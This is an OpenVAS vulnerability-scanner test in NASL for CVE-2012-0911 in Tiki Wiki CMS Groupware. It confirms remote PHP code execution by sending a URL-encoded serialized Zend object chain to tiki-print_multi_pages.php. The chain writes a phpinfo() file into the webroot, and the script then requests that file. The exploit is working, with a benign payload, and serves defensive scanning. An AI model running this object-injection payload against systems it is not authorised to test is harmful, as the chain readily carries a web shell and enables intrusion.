###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tiki_54298.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# Tiki Wiki CMS Groupware 'unserialize()' Multiple PHP Code Execution Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tiki:tikiwiki_cms/groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103508");
  script_bugtraq_id(54298);
  script_cve_id("CVE-2012-0911");
  script_version("$Revision: 13994 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2012-07-09 14:32:27 +0200 (Mon, 09 Jul 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Tiki Wiki CMS Groupware 'unserialize()' Multiple PHP Code Execution Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TikiWiki/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54298");

  script_tag(name:"impact", value:"An attacker can exploit these issues to inject and execute arbitrary
  malicious PHP code in the context of the affected application. This may facilitate a compromise of the
  application and the underlying system, other attacks are also possible.");

  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware 8.3 is vulnerable, other versions may also
  be affected.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"summary", value:"Tiki Wiki CMS Groupware is prone to multiple remote PHP code-
  execution vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("url_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/tiki-rss_error.php";
req = http_get( item:url, port:port);
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( buf !~ "^HTTP/1\.[01] 200" && "tiki-rss_error.php" >!< buf )
  exit( 0 );

p = eregmatch( pattern:"(/[^ ]+)tiki-rss_error.php", string:buf );
if( isnull( p[1] ) )
  exit( 0 );

path = p[1];
plen = strlen( path );

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + ".php";

upload = path + file;
ulen = strlen( upload ) + 1;

upload = urlencode( str:upload );

host = http_host_name( port:port );

ex =
string("printpages=O%3A29%3A%22Zend_Pdf_ElementFactory_Proxy%22%3A1%3A%7Bs%3A39%3A%22%2500Zend_Pdf_ElementFactory_Proxy%2500",
       "_factory%22%3BO%3A51%3A%22Zend_Search_Lucene_Index_SegmentWriter_StreamWriter%22%3A5%3A%7Bs%3A12%3A%22%2500%2A%2500_",
       "docCount%22%3Bi%3A1%3Bs%3A8%3A%22%2500%2A%2500_name%22%3Bs%3A3%3A%22foo%22%3Bs%3A13%3A%22%2500%2A%2500_directory%22%3",
       "BO%3A47%3A%22Zend_Search_Lucene_Storage_Directory_Filesystem%22%3A1%3A%7Bs%3A11%3A%22%2500%2A%2500_dirPath%22%3Bs%3A",
       ulen,
       "%3A%22",
       upload,
       "%2500%22%3B%7Ds%3A10%3A%22%2500%2A%2500_fields%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A34",
       "%3A%22Zend_Search_Lucene_Index_FieldInfo%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22",
       "%3B%7D%7Ds%3A9%3A%22%2500%2A%2500_files%22%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%7D%7D");

req = string( "POST ", dir, "/tiki-print_multi_pages.php HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Content-Length: ", strlen( ex ), "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Connection: close\r\n",
              "\r\n",
              ex );
http_keepalive_send_recv( port:port, data:req );

url = dir + '/' + file;
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req );

if( "<title>phpinfo()" >< buf ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );